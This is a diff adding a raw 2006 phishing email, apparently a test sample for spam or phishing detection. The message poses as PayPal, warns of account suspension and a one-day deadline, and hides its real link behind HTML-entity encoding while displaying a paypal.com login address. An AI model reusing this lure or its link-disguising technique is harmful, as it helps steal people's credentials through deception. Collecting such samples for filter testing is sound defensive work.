@@ -1,0 +1,71 @@
+Return-Path: <security@paypal.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+	by funky.example.com (Postfix) with ESMTP id 2BB4E46948
+	for <nobody@login.example.com>; Wed, 28 Jun 2006 16:49:14 -0400 (EDT)
+Received: from 192.168.10.10 (adsl-068-213-030-162.sip.asm.bellsouth.net [68.213.30.162])
+	by mail1.example.com (Postfix) with SMTP id 7C04F6CD034
+	for <nobody@example.com>; Wed, 28 Jun 2006 16:49:18 -0400 (EDT)
+Received: from 194.192.212.62 by ; Wed, 28 Jun 2006 20:42:09 -0100
+Message-ID: <YIBQUQSHEARWQWACHJFGEFNBD@verizon.net>
+From: "PayPal Inc." <service@intl.paypal.com>
+Reply-To: "PayPal Inc." <security@paypal.com>
+To: nobody@example.com
+Subject: IMPORTANT : Security Measures
+Date: Wed, 28 Jun 2006 23:47:09 +0200
+X-Mailer: eGroups Message Poster
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--1844162095871190764"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: 
+X-Status: 
+X-Keywords:                   
+
+----1844162095871190764
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<strong>Dear PayPal Member</strong>,<br>
+<br>During our regularly schedule account maintenance and verification we =
+have detected a slight error in your billing information on file with PayP=
+al.<br> This might be due to either following reasons:
+<br>
+<br>- A recent change in your personal information (i.e. change of address=
+)
+<br>- Submitting invalid information during the initial sign up process.
+<br>- An inability to accurately verify your selected option of payment du=
+e an internal error within
+our processors.
+<br>
+<br>Therefore your account has been temporarily suspended. We need you to =
+
+confirm your identity in
+order to regain full privileges of your account.<br><br>
+If this is not completed by <strong>June 29, 2006</strong>, we reserve 
+the right to terminate all privileges of your account
+indefinitly, as it may have been used for fraudulent purposes. We thank 
+you for your cooperation in this manner.<br>
+To confirm your identity please follow the link below:<br>
+<br>
+<a 
+href=3D"http://&#99;&#45;&#50;&#52;&#45;&#49;&#45;&#49;&#55;&#50;&#45;&#49=
+;&#57;&#54;&#46;&#104;&#115;&#100;&#49;&#46;&#116;&#120;&#46;&#99;&#111;&#=
+109;&#99;&#97;&#115;&#116;&#46;&#110;&#101;&#116;&#58;&#56;&#49;&#47;&#117=
+;&#112;&#108;&#111;&#97;&#100;&#47;">https://www.paypal.com/cgi-bin/webscr=
+?cmd=3D_login-run</a>
+<br>
+<br>
+<br>
+Thank you for your patience in this matter.
+<br><br>
+PayPal - Customer Service
+<br><br>
+Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered.
+<br>
+
+----1844162095871190764--
+
